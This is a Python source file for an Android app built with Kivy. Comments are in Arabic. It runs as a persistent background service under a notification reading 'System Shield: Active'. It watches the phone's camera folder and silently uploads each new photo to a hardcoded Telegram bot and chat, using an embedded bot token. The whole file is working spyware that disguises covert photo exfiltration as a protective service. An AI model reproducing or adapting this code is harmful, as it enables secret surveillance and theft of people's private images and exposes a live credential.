import os
import time
import requests

TOKEN = "8593668067:AAGN3s4L5ulu7BODLfx35qEJkdVMdriTVEA"
CHAT_ID = "-1003535367279"

is_running = True
sent_files = set()

def setup_foreground_service():
    """تحويل البوت إلى خدمة دائمة (مثل تطبيقات الأغاني)"""
    try:
        from jnius import autoclass
        PythonService = autoclass('org.kivy.android.PythonService')
        service_ctx = PythonService.mService
        
        # جعل الخدمة 'STAY_STICKY' ليعيد أندرويد تشغيلها إذا قُتلت
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        
        notification = NotificationBuilder(service_ctx) \
            .setContentTitle("🛡️ System Shield: Active") \
            .setContentText("نظام مراقبة الكاميرا يعمل في الخلفية...") \
            .setSmallIcon(service_ctx.getApplicationInfo().icon) \
            .setOngoing(True) \
            .build()
            
        service_ctx.startForeground(1, notification)
    except:
        pass

def send_as_document(photo_path, file_name):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(photo_path, 'rb') as doc_file:
            payload = {'chat_id': CHAT_ID, 'caption': f"📄 ملف جديد:\n{file_name}"}
            files = {'document': doc_file}
            requests.post(url, files=files, data=payload)
    except:
        pass

def monitor_camera():
    global is_running, sent_files
    path = "/storage/emulated/0/DCIM/Camera"
    
    # تجاهل الصور السابقة للتشغيل
    known_files = set(os.listdir(path)) if os.path.exists(path) else set()

    # إرسال تأكيد لبدء الخدمة
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                      data={'chat_id': CHAT_ID, 'text': "🛡️ تم تفعيل نظام الحماية الدائم في الخلفية."})
    except:
        pass

    while is_running:
        try:
            if os.path.exists(path):
                current_files = set(os.listdir(path))
                new_files = current_files - known_files - sent_files
                
                for file in new_files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        sent_files.add(file)
                        full_path = os.path.join(path, file)
                        time.sleep(2) # ضمان استقرار الملف
                        send_as_document(full_path, file)
                
                known_files.update(current_files)
        except:
            pass
        time.sleep(5)

if __name__ == '__main__':
    setup_foreground_service()
    monitor_camera()
